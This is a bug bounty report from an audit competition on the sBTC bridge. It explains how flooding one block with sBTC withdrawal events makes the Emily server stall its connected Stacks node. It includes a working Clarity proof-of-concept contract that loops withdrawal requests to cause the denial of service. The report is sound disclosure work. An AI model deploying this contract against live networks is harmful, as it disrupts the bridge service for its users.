# #41597 \[BC-Insight] Emily server can crash their connected Stacks node when processing a large number of events

**Submitted on Mar 16th 2025 at 20:35:14 UTC by @vini\_btc for** [**Attackathon | Stacks II**](https://immunefi.com/audit-competition/stacks-attackathon-2)

* **Report ID:** #41597
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_1.0>
* **Impacts:**
  * API crash preventing correct processing of deposits

## Description

## Brief/Intro

Emily might cause their connected Stacks Node to halt due a timeout processing sbtc events.

## Vulnerability Details

If offered a large number of sBTC events in a single block, the Emily server will try to process all of them, delaying the response to the node event observer. The event observer eventually timeouts, restarting the process, leading the node to stall.

## Impact Details

All the bridge website information would no longer be up-to-date, degrading the bridge UI/UX significantly.

## References

This vulnerability was in part discussed in <https://bugs.immunefi.com/dashboard/submission/40692>

## Proof of Concept

## Proof of Concept

The following contract could be used to trigger 625 sbtc withdraw requests in a single block:

```
(define-private (abuse-withdrawal (res bool) (mes bool))
	(begin
   ;; BTC pubkey: 02e3af28965693b9ce1228f9d468149b831d6a0540b25e8a9900f71372c11fb277
   ;; BTC pubkey HASH160: 1e51fcdc14be9a148bb0aaec9197eb47c83776fb
		(is-err (contract-call? 'SN3R84XZYA63QS28932XQF3G1J8R9PC3W76P9CSQS.sbtc-withdrawal initiate-withdrawal-request u1000 {version: 0x00, hashbytes: 0x1e51fcdc14be9a148bb0aaec9197eb47c83776fb} u0))
		 res
	)
)

(define-public (abuse)
 (ok (fold abuse-withdrawal (list 
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
  true true true true true true true true true true true
) true)))
```

This leads Emily + connected Stacks node to stall.
